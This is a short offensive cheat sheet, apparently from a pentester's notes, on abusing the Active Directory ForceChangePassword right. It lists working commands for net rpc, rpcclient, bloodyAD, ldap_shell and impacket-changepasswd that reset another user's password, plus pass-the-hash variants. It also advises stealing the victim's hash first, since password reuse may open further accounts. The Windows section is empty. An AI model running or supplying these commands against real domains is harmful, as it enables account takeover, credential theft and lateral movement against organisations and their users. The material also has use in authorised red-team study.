# Abusing ForceChangePassword

If an user have ForceChangePassword over another user can change that user password. If you have other options to steal the hash from that user, I strongly recommend you to do it before change their password. That hash could be valid for other users if password is reused. 

### From Linux (enternally recomended):

Samba tools -> `net rpc password '<target_user>' '<new_password>' -U '<domain>'/'<controlled user>'%'<password>' -S '<dc_ip>'`

rpcclient -> `-U <domain>/<controlled_user> <dc-ip>`

`rpcclient $> setuserinfo <target_user> 23 <new_password>`

BloodyAD -> `bloodyAD --host 'dc_ip' -d '<domain>' -u '<user>' -p '<password>' set password <target_user> '<new_password>'`

Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`

`set password <target_user> <new_password>`

<br>

Using SMB protocol:

`impacket-changepasswd <domain>/<target_user>@<ip> -newpass <new_password> -altuser <controlled_user>/raj -altpass <controlled_user_password> -reset`

<br>

With PASS THE HASH option:

Samba tools -> `pth-net rpc password '<target_user>' '<new_password>' -U '<domain>'/'<controlled user>'%'LMhash':'NThash' -S '<dc ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p ':<nt_hash>' set password '<target_user>' '<new_password>'`

Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes ffffffffffffffffffffffffffffffff:<nt_hash> -dc-ip <ip>`

`set password <target_user> <new_password>`

<br>

### From Windows (internally):








